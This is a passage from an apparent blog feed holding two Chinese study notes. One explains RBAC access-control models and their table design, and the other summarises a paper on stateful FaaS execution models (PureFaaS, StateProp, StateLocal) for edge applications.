        <content type="html"><![CDATA[<h2 id="0-rbac-%E5%92%8C-abac" tabindex="-1">0 RBAC 和 ABAC</h2><ul><li><p>RBAC：Role-Based Access Control 基于角色的访问控制</p></li><li><p>ABAC：Attribute-Based Access Control 基于属性的访问控制</p></li><li><p>美国国家标准与技术研究院为RBAC分了4级，为RBAC0-3</p></li></ul><h2 id="1-rbca%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5" tabindex="-1">1 RBCA基础概念</h2><ul><li><p>RBAC：Role-Based Access Control，基于角色的访问控制。</p></li><li><p>通过引入 角色 这一概念，将用户和权限解耦，来满足权限的批量管理。</p></li><li><p>实现最简单的RBAC系统(也就是RBAC0)一共需要五张表：三张信息表和两张关系表。</p><ul><li>三张信息表：用户信息表、角色信息表和权限信息表</li><li>两张关系表：用户-角色关系表、角色-权限关系表</li></ul></li><li><p>模型操作</p><ul><li>授权：通过给用户分配不同的角色，来改变其拥有的权限。<ul><li>例子：管理员应用增删改查四种权限，访问者只有查的权限，对于新增用户老李，直接授予去管理者或者访问者角色，获得对应的权限</li><li>RBAC中只需在用户-角色关系表中增加一个数据即可</li></ul></li><li>鉴权：验证某个是否拥有某个权限<ul><li>过程：<ul><li><ol><li>传入用户和权限信息</li></ol></li><li><ol start="2"><li>根据用户-角色表获得该用户的所有角色</li></ol></li><li><ol start="3"><li>根据角色-权限表获得该用户拥有的所有权限</li></ol></li><li><ol start="4"><li>对比权限数据</li></ol></li></ul></li></ul></li><li>权限变更：收回或者增加权限<ul><li>操作：收回权限只需在角色-权限表中删除对应的一条数据即可，增加同理</li></ul></li></ul></li><li><p>RBAC0的缺点</p><ul><li><ol><li>在复杂的业务场景中，同一个角色在不同的情况下拥有不同的权限。</li></ol></li><li><ol start="2"><li>对于管理员或者超级管理员这类上层角色，拥有很多权限，每当出现一个权限，都要将权限绑定给他们，当这类管理角色增多时，RBAC0的模型成本会上升，这一问题在RBAC1中得到解决</li></ol></li><li><ol start="3"><li>角色爆炸时，RBAC模型难以维护，这是可以转为ABAC模型</li></ol></li></ul></li></ul><h2 id="2-rbac%E8%BF%9B%E9%98%B6" tabindex="-1">2 RBAC进阶</h2><h3 id="2.1-rbac1" tabindex="-1">2.1 RBAC1</h3><ul><li>动机举例：<ul><li>一个企业有老板，主管，员工等角色，则整体结构如下<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_1.webp" alt></li><li>该结构中上级有下级的所有权限，不同的角色间有着重叠的权限，此时如果新增一条员工的权限，需要同时绑定给主管和老板，否则会出现员工有权限，老板没权限的情况</li><li>为此，RBAC1中引入了角色继承，在RBAC1中，角色之间有层级关系，上级角色默认拥有下级角色的全部权限，于是新的结构如下<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_2.webp" alt></li><li>此时就不会出现下级角色拥有上级角色所没有的权限了，由于生活中的各种角色也具有类型的层级关系，因此，RBAC1是最常用的权限模型。</li></ul></li><li>模型结构：<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_3.webp" alt></li><li>实现<ul><li>三张数据表：用户表、角色表、权限表。</li><li>三张关系表：用户-角色关系表、角色-继承关系表、角色-权限关系表。</li></ul></li><li>实现中的一个细节：角色-权限关系表有两种方案<ul><li><ol><li>仅记录与角色直接关联的权限。</li></ol><ul><li>优点：生效快，角色继承关系一旦生效，那么鉴权就能通过</li><li>缺点：鉴权时，需要先拿到用户的所有角色及其子角色(读扩散)，然后对比全部角色的全部权限点。在角色数量比较多的时候，会影响鉴权接口的响应时间。</li><li>优势场景：角色继承关系频繁变动的场景。</li></ul></li><li><ol start="2"><li>记录与角色直接关联的权限，且记录从子角色继承而来的权限。</li></ol><ul><li>优点：鉴权较快，不存在读扩散的问题。</li><li>缺点：每次角色继承关系变动的时候，都需要对上层角色进行大量的权限绑定与解绑操作(写扩散)。</li><li>优势场景：角色继承关系变化很少的场景。</li></ul></li></ul></li><li>两全其美的方法：我全都要<ul><li>使用两张角色权限关系表，一张仅记录直接关联的权限，一张记录全部权限。</li><li>鉴权时：优先查询全部权限关系表，若鉴权失败，则自动降级查询继承关系的鉴权模式。</li></ul></li></ul><h3 id="rbac2" tabindex="-1">RBAC2</h3><ul><li>静态职责分离（SSD）<ul><li>互斥角色：同一用户只能分配到一组互斥角色集合中至多一个角色，比如用户不能同时拥有会计和审计两个角色</li><li>基数约束：一个用户可拥有的角色数目受限；一个角色可被分配的用户数量受限；一个角色对应的权限数目受限</li><li>先决条件角色：用户想要成为上级角色，必须先成为下一级角色，比如游戏中的转职</li></ul></li><li>动态职责分离（DSD）<ul><li>允许一个用户具有多个角色，但在运行时只能激活其中某些角色，比如BOSS直聘，一个用户既可以是招聘者也可以是应聘者，但同时只能选择一种身份进行操作</li></ul></li></ul><h3 id="rbac3" tabindex="-1">RBAC3</h3><p>RBAC1 + RBAC2，既有角色继承，也有各种限制条件。</p><h2 id="3-rbac%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%92%E5%88%86" tabindex="-1">3 RBAC中的用户划分</h2><h3 id="3.1-%E7%94%A8%E6%88%B7%E7%BB%84" tabindex="-1">3.1 用户组</h3><ul><li>用户组是一群用户的组合，而角色是用户和权限之间的桥梁。<ul><li>用户组把相同属性的用户组合起来，比如同一个项目的开发、产品、测试可以是一个用户组，同一个部门的相同职位的员工可以是一个用户组， 一个用户组可以是一个职级，可以是一个部门，可以是一起做事情的来自不同岗位的人。</li></ul></li><li>用户可以分组，权限也可以分组，权限特别多的情况下，可以把一个模块的权限组合起来成为一个权限组，权限组也是解决权限和角色对应关系复杂的问题。</li></ul><p>此时RBAC模型为<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/3_1_1.png" alt></p><h3 id="3.2-%E7%BB%84%E7%BB%87" tabindex="-1">3.2 组织</h3><ul><li>每个公司都有自己的组织架构，很多时候权限的分配可以根据组织架构来划分。统一组织内的人权限大都一样</li><li>按组织分配角色的优势<ul><li>实现权限分配的自动化： 和组织关系打通之后，按照组织来分配角色，如果有新入职的用户，被划分在某个组织下面之后，会自动获取该组织下所有的权限，无需人工分配。又比如有用户调岗，只需要把组织关系调整就可以了，权限会跟着组织关系自动调整，也无需人工干预。这么做首先需要把权限和组织关系打通。</li><li>控制数据权限： 把角色关联到组织，组织里的成员只能看到本组织下的数据，比如市场推广和大客定制，市场推广针对的是零散的客户，大可定制针对的是有一定体量的客户，相互的数据虽然在一个平台，但是只能看自己组织下的数据。</li></ul></li><li>加入组织后的模型图<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/3_2_1.png" alt></li></ul><h3 id="3.3-%E8%81%8C%E4%BD%8D" tabindex="-1">3.3 职位</h3><p>一个组织下面会有很多职位，比如财务管理会有财务总监、财务主管、会计、出纳员等职位，每个职位需要的权限是不一样的，可以像组织那样根据职位来分配不同的角色，由于一个人的职位是固定的，所以用户跟职位的对应关系时一对一的关系，职位跟角色的对应关系可以是多对多的关系。</p><h2 id="4-%E7%90%86%E6%83%B3%E7%9A%84rbac%E6%A8%A1%E5%9E%8B" tabindex="-1">4 理想的RBAC模型</h2><p>把RBAC、RBAC1、RBAC2、用户组、组织、职位汇总起来的模型如下所示：<br><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/4_1.png" alt></p><h2 id="5-%E6%9D%83%E9%99%90%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5 权限系统的表设计</h2><h3 id="5.1-%E6%A0%87%E5%87%86rbac%E6%A8%A1%E5%9E%8B%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5.1 标准RBAC模型表设计</h3><p><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/5_1.png" alt></p><h3 id="5.2-%E7%90%86%E6%83%B3rbac%E6%A8%A1%E5%9E%8B%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5.2 理想RBAC模型表设计</h3><p><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/5_2.png" alt></p><h2 id="%E5%8F%82%E8%80%83" tabindex="-1">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/511846624">权限系统设计之RBAC</a><br><a href="https://zhuanlan.zhihu.com/p/516533087">权限系统之RBAC进阶</a><br><a href="https://blog.csdn.net/u010482601/article/details/104989532">全网最全的权限系统设计方案，不接受反驳！</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RBAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FaaS Execution Models for Edge Applications</title>
      <link href="/2023/06/05/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/FaaS%20Execution%20Models%20for%20Edge%20Applications/"/>
      <url>/2023/06/05/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/FaaS%20Execution%20Models%20for%20Edge%20Applications/</url>
      
        <content type="html"><![CDATA[<p><img src="https://arxiv.org/pdf/2111.06595.pdf" alt="论文连接"></p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li><p>在这篇论文中，我们解决了在边缘网络中支持基于函数即服务（FaaS）模型的有状态工作流的问题。</p></li><li><p>特别是我们关注数据传输问题，由于某些边缘场景中通信链路速度有限，这可能成为性能瓶颈。为此，我们提出了三种不同的方案：</p><ul><li>纯FaaS实现</li><li>StateProp（应用状态在整个函数链中传播）</li><li>以及StateLocal（状态仅保留在运行函数的工作节点上，需要时进行检索）。</li></ul></li><li><p>然后，我们将提出的方案扩展到应用程序建模为有向无环图（DAG）的更一般情况，这种建模方法涵盖了广泛的实际应用场景，例如物联网（IoT）领域。</p></li><li><p>我们的贡献通过原型实现进行了验证。在模拟条件下的实验表明，应用数据本地化原则显著减少了所需的网络流量并改善了端到端的延迟性能，尤其是在边缘节点上进行本地缓存和低链路速度的情况下。</p></li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li>这篇论文中，我们针对有状态函数工作流中的数据传输问题（包括参数/返回值和应用状态）</li><li>以第2节中介绍的实际应用案例为动机进行了研究，</li><li>在回顾现有技术（第3节）之后，</li><li>我们在我们之前的工作中总结了研究结果（第4节），提出了三种完全去中心化的执行模型：PureFaaS、StateProp和StateLocal</li><li>第5节中，这些模型扩展到将应用程序建模到DAG的更一般情况</li><li>第6节中比较他们的性能</li><li>第7节中得出结论</li></ul><h2 id="2-%E5%8A%A8%E6%9C%BA%EF%BC%9A%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B" tabindex="-1">2 动机：实际应用案例</h2><ul><li><p>一个用于智慧城市的实时分析框架，与几个高影响的应用相关</p><ul><li>自动检测异常交通情况</li><li>检测拥挤区域</li><li>保护脆弱人群</li><li>公共事件中的情绪识别等</li></ul></li><li><p>这些应用程序有着相似的总体结构<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E6%A1%88%E4%BE%8B%E6%80%BB%E4%BD%93%E7%BB%93%E6%9E%84.jpg" alt></p><ul><li>从传感器获取数据开始，首先进行匿名化处理以删除个人数据，然后提取相关特征并用于触发基于机器学习（ML）的决策过程。</li><li>此时普通的Serverless不能在这里采用，原因<ul><li><ol><li>无状态执行是不够的：一些组件需要对程序状态进行读写访问</li></ol></li><li><ol start="2"><li>FaaS支持函数链，但这里工作流程为DAG</li></ol></li></ul></li></ul></li><li><p>这些应用的状态可以保存在3个位置</p><ul><li><ol><li>本地客户端</li></ol></li><li><ol start="2"><li>边缘节点</li></ol></li><li><ol start="3"><li>云端</li></ol></li></ul></li><li><p>而对于这些可保存状态的文职，随着传感器获得数据大小的增加，3个位置时延的增加有所不同<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E6%A1%88%E4%BE%8B%E6%97%B6%E5%BB%B6.jpg" alt></p><ul><li>云端时延最高，且随着状态的增大而显著增大</li><li>状态在边缘或者客户端维护时，没有明显增加，但事实需要更高的网络流量成本</li></ul></li><li><p>综上：由DAG状态函数组成的数据密集型应用程序（例如实时智慧城市分析）的性能在很大程度上取决于状态的存储位置，而这也是本文研究的主题。</p></li><li><p>DAG状态应用程序并不是特殊情况，依据阿里巴巴数据中心的生产系统中收集的真实云应用程序的跟踪信息：</p><ul><li>由DAG组成的占21.7%</li><li>单个任务28.6%</li><li>链占49.7%</li></ul></li></ul><h2 id="3-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">3 相关工作</h2><ul><li>云中的无服务器平台依赖于底层容器编排系统，这些系统处理自动缩放并负责保持一致的性能。然而，当在边缘使用这些编排工具时，设备是异构且集群化的，这会导致低效的性能。</li><li>支持有状态应用程序是云中无服务器计算定位文件中确定的关键研究挑战之一</li><li>目前，边缘网络中的有状态FaaS在很大程度上尚未被探索，这是我们的动机，探索不同的方法来处理函数调用的链和DAG的参数和状态分配。在实际部署中，可以将复杂的状态管理系统与我们在本文中提出的执行模型结合使用。</li><li>之后再补充</li></ul><h2 id="4-%E6%9C%89%E7%8A%B6%E6%80%81%E7%9A%84%E5%87%BD%E6%95%B0%E9%93%BE" tabindex="-1">4 有状态的函数链</h2><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B.jpg" alt></p><ul><li>图中共有四个边缘节点，表示为ni，每个节点都托管一个无服务器平台，可以通过一组工作节点执行一个或多个类型的Lambda函数，表示为λi。例如，n1可以执行Lambda函数λ1和λ4，但不能执行λ2和λ3。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E7%A4%BA%E4%BE%8B%E7%94%A8%E6%88%B7%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F.jpg" alt></p><ul><li>考虑上图的示例用户应用程序<ul><li>客户端需要将输出提供给λ1</li><li>λ1需要应用状态SA，其输出out1需要提供λ2</li><li>以此类推，最终输出out4返回客户端</li></ul></li><li>在云中，有状态函数通过访问外部服务（例如内存数据库或存储服务）来实现无状态函数。然而这种方法在边缘上并不高效，由此提出三种方法，下列方法中假设函数分配为：[λ1，λ2，λ3，λ4] → [n1，n4，n2，n1]。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>PureFaaS中，函数链中的函数一个接一个地执行，并且每次调用时都会来回传输每个函数所需的状态，如上图示，只要满足以下两个条件，就可以在商业/开源的无服务器平台上轻松实现此策略<ul><li><ol><li>函数的签名（包括参数和返回值）支持客户端嵌入所需的状态</li></ol></li><li><ol start="2"><li>客户端事先知道每个下一个被调用的函数所需的状态。</li></ol></li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/StateProp%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>StateProp中，它利用了大多数无服务器平台提供的链式功能，如上图示，客户端将应用程序的完整状态嵌入到函数的参数和返回值中：不使用嵌入状态的函数将简单地将其传递，而其他函数将将接收到的修改后的状态作为函数参数嵌入，并最终返回给客户端。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/StateLocal%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>StateLocal将状态保留在边缘节点中,如上图所示，不是将状态嵌入到函数调用中，而是仅传递指针。<ul><li>当一个Lambda函数需要状态时，它通过指针检索状态，然后成为状态的新所有者，从而修改链中后续函数调用中的状态指针。</li><li>这样，客户端最终将返回所有状态的更新指针列表，以便在后续应用程序执行中使用它们，或者在需要时从边缘节点中撤回状态。</li></ul></li></ul><h2 id="5-%E6%89%A9%E5%B1%95%E5%88%B0dag" tabindex="-1">5 扩展到DAG</h2><h3 id="5.1-dag%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%A4%BA" tabindex="-1">5.1 DAG特定符号表示</h3><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE1.jpg" alt></p><ul><li>一组任务之间的关系：如果任务λi必须在任务λj之前执行，则存在边λi → λj。这些先行关系定义了一个有向图，称为任务依赖图，最后形成DAG</li><li>任务也可能依赖某些状态：态依赖图是一个无向图，其中边λi → Sx表示任务λj需要访问状态Sx。任务依赖图和状态依赖图的并集生成任务-状态依赖图；如上图示</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE2.jpg" alt></p><ul><li><p>在应用程序的单次执行过程中，可能会出现多个任务需要在同一状态上操作的情况，就像上图中的示例一样。根据应用程序的内部逻辑，可能会出现以下情况</p><ul><li><ol><li>执行顺序无关紧要</li></ol></li><li><ol start="2"><li>λ2必须在λ3之前执行</li></ol></li><li><ol start="3"><li>λ3必须在λ2之前执行</li></ol></li></ul></li><li><p>服务器无状态平台需要从应用程序中了解依赖于共享状态的任务的执行时间顺序，以保持状态的因果一致性。为此，我们通过以下方式来捕捉这种时间顺序，将任务-状态依赖图进行扩展：</p><ul><li>如果λi和λj都使用相同的状态，并且λi必须在λj之前执行以确保共享状态的因果一致性，我们添加一个虚拟边λi → λj，虚线表示，如上图示。</li></ul></li><li><p>添加虚拟边会影响可以实现的并行性：没有状态依赖关系的情况下，在上图中的DAG可以执行为{λ1, λ2 | λ3, λ4}（其中|表示两个任务可以并行执行）</p><ul><li>但在下图中需要虚拟边λ4 → λ2，但这会创建循环λ2 → λ3 → λ4，从而导致死锁：λ4无法执行，直到它接收到λ3的输出，而λ3无法运行，直到它接收到λ2的输出，而λ2在λ4执行完成之前无法访问状态S.</li><li>由于应用程序可以检测到这种情况，并且这反映了逻辑设计问题，因此我们假设我们感兴趣的应用程序仅限于具有非循环的扩展任务-状态依赖图。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE3.jpg" alt></li></ul></li></ul><h3 id="5.2-purefaas%E6%A8%A1%E5%9E%8B%E6%89%A9%E5%B1%95" tabindex="-1">5.2 PureFaaS模型扩展</h3><ul><li>PureFaaS在链式函数调用和DAG中的使用方式保持不变，除了可以并行执行一些任务外。类似于拓扑排序，下图为示例</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%A8%A1%E5%9E%8B%E6%8B%93%E5%B1%951.jpg" alt><br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%A8%A1%E5%9E%8B%E6%8B%93%E5%B1%95.jpg" alt></p><h3 id="5.3-stateprop%2Fstatelocal%E6%A8%A1%E5%9E%8B%E6%89%A9%E5%B1%95" tabindex="-1">5.3 StateProp/StateLocal模型扩展</h3><ul><li><p>StateProp和StateLocal都依赖于工作节点在当前函数完成后调用下一个函数；它们在状态管理方面有所区别：StateProp沿着函数调用链传递状态，而StateLocal将状态保留在最后使用它的边缘节点内部。</p></li><li><p>首先，一个任务可能有多个输入，比如λ2和λ3都希望在各自的任务结束后执行λ4，因此“每个函数执行下一个函数”的概念并不像链式函数那样明确定义。我们通过引入异步调用的概念来解决这个问题：当一个函数终止时，它总是调用下一个函数（根据DAG的直接后继），但只有在所有输入都可用时才触发任务的执行。(这里相当于拓朴排序)</p><ul><li>如果情况不是这样，则前一个函数的输出暂时存储在边缘节点上，函数会暂停执行<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_1.jpg" alt></li><li>上图中的模式，增加了边缘节点上服务器无状态平台的复杂性，因为它们必须为每个不完整的操作维护一个临时状态。</li><li>但这种异步调用本身并不能解决问题：当λ2和λ3不同时调用n4节点的λ4时，将发生死锁</li></ul></li><li><p>因此，为了支持StateProp/StateLocal，至少在DAG应用的单个执行期间，所有工作节点都需要知道函数与边缘节点之间的映射关系。这样，我们可以确保所有工作节点将在相同的边缘节点上调用后续任务的执行，这将带来以下影响</p><ul><li><ol><li>函数与边缘节点之间的映射信息必须沿着执行DAG传递，这会略微增加协议开销</li></ol></li><li><ol start="2"><li>必须有一个能够在DAG被调用时“解析”所有函数的过程（例如，可以由客户端完成），这可能会增加启动延迟</li></ol></li></ul></li><li><p>但仍不够支持StateProp/StateLocal，如果λ2和λ3都依赖于相同的状态S。无论相对顺序如何，都需要将由第一个要执行的函数（例如λ2）修改的更新状态传递给另一个函数（例如λ3）。但是两者之间没有调用路径，即λ3不是DAG中λ2的后代，这使得仅仅依靠状态传播变得不可能。因此，提出第二个修改</p><ul><li>不再将状态嵌入函数参数（或其引用，对于StateLocal而言）</li><li>而是每个访问状态的函数将其直接发送给下一个将使用它的工作节点，根据状态依赖图和因果一致性约束，这两者已经是已知的。</li><li>因此，函数的工作节点必须准备好不仅接收异步调用并临时存储其参数，还要存储更新的状态，这些状态也是异步到达的。</li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_2.jpg" alt></p><ul><li>上图是同PureFaaS解决的依赖图中StateProp/StateLocal的顺序图，两者之间唯一的区别在于对于StateLocal，状态必须从最后的所有者中检索</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_3.jpg" alt></p><ul><li><p>上表为所有方案的流量交换</p></li><li><p>总结：StateProp和StateLocal可以支持DAG应用程序，但需要进行以下主要修改：</p><ul><li>工作节点必须支持异步函数调用</li><li>在单个DAG执行期间，函数和边缘节点之间的绑定必须为所有工作节点所知，而状态不能随参数一起传播</li></ul></li><li><p>这些变化增加了在边缘节点上运行的软件的复杂性和协议开销，并加剧了可能存在的有关披露专有信息的担忧</p></li></ul><h2 id="6-%E8%A1%A8%E7%8E%B0%E8%AF%84%E4%BC%B0" tabindex="-1">6 表现评估</h2><h3 id="6.1-%E6%89%A7%E8%A1%8C" tabindex="-1">6.1 执行</h3><ul><li><p>在ServerlessOnEdge框架中实现这三种方案</p><ul><li>该框架是一个分布式的调度无状态FaaS函数的框架</li><li>有论文团队开发和维护</li><li>在github开源</li></ul></li><li><p>在该框架中</p><ul><li>客户端通过e路由器调用请求函数</li><li>同时e路由器在无服务平台上充当中间人的角色，将无状态请求转发到根据负载和网络条件可用的多个目的地之一</li><li>实现了e计算机，它可以模拟具有特定配置的无服务器平台，包括计算速度、内存、容器数量等</li><li>ServerlessOnEdge使用谷歌的gRPC进行客户端、e路由器和e计算机之间的通信。</li></ul></li><li><p>PureFaaS的实现</p><ul><li><ol><li>客户端在每个函数调用时将所需的状态嵌入参数中</li></ol></li><li><ol start="2"><li>e计算机将嵌入的状态作为函数返回值的一部分返回</li></ol></li><li><ol start="3"><li>如果满足先决条件，会调用多个函数（仅适用于DAG）</li></ol></li></ul></li><li><p>StateProp的实现</p><ul><li><ol><li>实现异步调用：立即返回空的确认消息，而真正的输出由链中的最后一个e计算机作为主动回应消息提供给客户端</li></ol></li><li><ol start="2"><li>在每个e计算机上安装了一个附带的e路由器，用于调度由其e计算机生成的函数调用作为函数链的一部分执行，这样系统中的每个e计算机可以知道链中下一个函数的目的地</li></ol></li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_1_1.jpg" alt></p><ul><li><p>上图展示了StateProp的实现</p><ul><li λ1, λ4>图中共有5个边缘节点(主机1到主机5)，调用两个函数链</li><li>客户端在主机0上，主机0上e路由器被客户端用于调用链中的第一个函数（λ1，转发到主机1）</li><li>主机1上的e路由器接收到对λ4的下一次调用（转发到主机4）</li><li>主机4上的e计算机不需要经过其附带的e路由器，因为它可以将最终响应发送给主机0上的客户端</li></ul></li><li><p>StateLocal要求与StateProp相同，但还需要需他的一些升级</p><ul><li><ol><li>系统消息必须支持远程状态，即不直接嵌入函数调用/响应中的状态，而是通过它们的名称和端点间接引用</li></ol></li><li><ol start="2"><li>状态由称为状态服务器的新组件进行管理，它们是与每个e计算机和客户端共存的简单内存键值存储</li></ol></li><li><ol start="3"><li>消息流与StateProp完全相同，但在每个函数调用时，e计算机检索所需的远程状态，然后将其复制到本地状态服务器中；为了做到这一点，状态依赖性也嵌入在函数调用请求消息中。</li></ol></li></ul></li></ul><h3 id="6.2-%E7%BB%93%E6%9E%9C" tabindex="-1">6.2 结果</h3><ul><li>进行了两批实验，分别是函数链和有向无环图（DAG）</li></ul><h4 id="%E5%87%BD%E6%95%B0%E9%93%BE%EF%BC%9A" tabindex="-1">函数链：</h4><ul><li>实验条件：<ul><li>客户端执行长度为L（3或6）的函数链</li><li>其中每个函数随机选择自λ1、…、λ5，并可能重复。</li><li>我们假设应用程序有S个状态（3或6），其中第i个状态的大小为（1+i）×10 kB（以0为基的索引）；</li><li>每个状态依赖于随机选择的随机基数从0（无依赖关系）到L（链中的所有函数都依赖于该状态）。</li><li>输入参数和返回值的大小被假设为相同，并且等于A（10 kB或100 kB）。一组函数<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_1.jpg" alt></li></ul></li><li>如上图示，将在各个场景中使用不同执行模型获得的平均端到端延迟进行了比较，其中网络设备之间的链路速率从1 Mb/s增加到100 Mb/s。<ul><li>在左上角的图中<ul><li>PureFaaS和StateProp几乎重叠：这是因为状态和参数的大小相对较小；</li><li>直到链路速率低于20 Mb/s，StateLocal具有更低的平均延迟，这要归功于其更智能的仅在需要时传输状态的方法</li><li>然而，随着链路速率的提高，优势逐渐减小，直到延迟高于50 Mb/s和100 Mb/s链路速率下PureFaaS/StateProp的延迟：在如此高的连接速率下，数据传输变得与（或高于）建立TCP连接来检索/更新状态的时间相当</li></ul></li><li>在相反的情况，即右下角的图中<ul><li>StateProp和StateLocal的性能相当</li><li>除了在高链路速率下：这是因为链条比其他情景中的链条要短，数据传输由输入/输出参数主导，这两种方案的处理是一样的</li></ul></li><li>右上图和左下图是中间状况<ul><li>StateLocal在所有较慢的链路速率下都实现了更好的性能</li><li>而PureFaaS始终位于StateProp的顶部。</li></ul></li></ul></li><li>总结：<ul><li>对于函数链，考虑到实际的协议开销，根据状态大小和网络速度，存在将状态保持在边缘节点（StateLocal）和将其嵌入到函数调用中之间的权衡。</li><li>StateProp的性能始终优于PureFaaS。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_2.jpg" alt></li></ul></li><li>对比函数链时，三种模型中的平均网络流量,如上图，此时链路速度100Mb/s，时StateLocal表现最差的时候<ul><li>PureFaaS生成的流量始终大于StateProp生成的流量，而后者始终大于StateLocal生成的流量</li><li>对于函数链，即使在高网络速度下，StateLocal的开销（以所需的流量速率为衡量）明显低于其他方案，但这并不总是转化为更低的端到端延迟。</li></ul></li></ul><h3 id="dag" tabindex="-1">DAG</h3><ul><li>考虑由一系列阶段组成的应用程序，每个阶段都有一个分支函数，该函数生成多个无状态调用，然后是一个有状态的收集任务。这种结构在ML应用程序中非常典型</li><li>我们使用了3个阶段，每个阶段有5个分支。函数是从边缘节点中随机选择的，状态依赖关系也是随机的，使用与链式结构相同的方法。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_2_3.jpg" alt></li><li>在上图中，展示了平均延迟随链路速率从1 Mb/s增加到100 Mb/s的变化（对数-对数图），以及仅针对链路速率为100 Mb/s的网络流量<ul><li>我们发现PureFaaS在所有情况下都优于StateProp，且在参数大小较小时优势更为突出。这是因为调用的总函数数量远远超过链式情况，这会严重影响将所有状态嵌入到调用和响应中。</li><li>StateLocal不需要支付这样的代价，它只传递状态的引用，并在除了非常高的链路速率之外的所有情况下表现最好，这是由于状态检索/更新操作的开销</li></ul></li><li>总结：对于具有大量函数的DAG，只有在函数调用和响应中携带引用时，状态传播才有效，即StateLocal更有效</li></ul><h2 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h2><ul><li>在本文中，我们探讨了在分布在边缘节点上的无服务器平台上支持有状态应用程序的问题。</li><li>我们重点关注在链式和DAG工作流中沿函数调用传递状态的问题，并提出了三种不同特性的替代方案。</li><li>我们开发了一个原型实现来验证我们的方法的可行性，并使用真实的协议开销来衡量性能。</li><li>结果表明，在函数调用链中传播状态可以显著减少通信开销。这可以降低端到端的应用程序延迟，尤其是在连接有限的情况下。</li><li>然而，对于大型DAG工作流，再嵌入状态以进行传播就不再有效了：在这些情况下，必须在边缘节点上本地存储状态并传递它们的引用。</li></ul><h2 id="%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD" tabindex="-1">专业术语</h2><h3 id="faas-%26-serverless" tabindex="-1">FaaS &amp; 